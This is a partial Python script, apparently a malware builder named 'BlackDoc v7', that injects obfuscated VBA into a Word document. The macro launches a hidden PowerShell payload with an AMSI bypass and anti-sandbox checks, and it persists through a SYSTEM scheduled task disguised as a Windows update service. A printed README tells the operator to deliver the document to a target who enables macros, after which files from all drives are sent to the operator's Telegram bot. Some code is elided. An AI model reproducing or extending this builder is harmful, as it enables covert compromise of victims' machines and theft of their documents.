...
def generate_wrapper_script(core_b64):
    var = [''.join(random.choices(string.ascii_letters, k=10)) for _ in range(10)]
    v_payload, v_task, v_action = var[6], var[7], var[8]
    # New AMSI bypass C# code (from the provided snippet)
    amsi_code = r'''
$code = @'
using System;
...
{anti_sandbox}
${v_payload} = "{core_b64}"
${v_task} = "WindowsUpdateService" + (Get-Random -Max 999)
${v_action} = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${v_payload}"
$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddHours(1)
Register-ScheduledTask -TaskName ${v_task} -Action ${v_action} -Trigger $trigger -Description "System Maintenance" -User "SYSTEM" -RunLevel Highest -Force
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoP -NonI -Exec Bypass -EncodedCommand ${v_payload}"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(${v_payload})) | iex
"""
    return wrapper
...
def main():
  ...
  ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
   ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀ 
          BLACKDOC v7 – Hardcore AMSI Bypass
    """)
    ...
    wrapper_script = generate_wrapper_script(core_b64)
    wrapper_bytes = wrapper_script.encode('utf-16le')
    wrapper_b64 = base64.b64encode(wrapper_bytes).decode('ascii')
    vba_code = generate_obfuscated_vba(wrapper_b64)
    output_file = "BlackDoc.docm"
    inject_macro_into_docx(docx_path, output_file, vba_code)
    print("\n[+] BlackDoc v7 generated.")
    print("[!] On Windows: AMSI patched via P/Invoke, ETW disabled, anti‑sandbox.")
    print("[!] Scans all drives, batches ZIPs >50MB, splits large files.")
    print("[!] Persistence via scheduled task – survives document deletion.")
    print("[!] Mobile: no effect (macros unsupported).")
    print("\n=== README ===")
    print("1. Install Python, pywin32 (pip install pywin32).")
    print("2. Run the script, provide a clean .docx and your Telegram bot token/chat ID.")
    print("3. Deliver the generated BlackDoc.docm to the target.")
    print("4. The target must click 'Enable Content' (or have an unpatched CVE).")
    print("5. The payload exfiltrates documents/images, batch/split as needed.")
    print("6. Persistence: scheduled task runs every 6 hours.")
    print("7. Use only on systems you own or have explicit permission to test.")
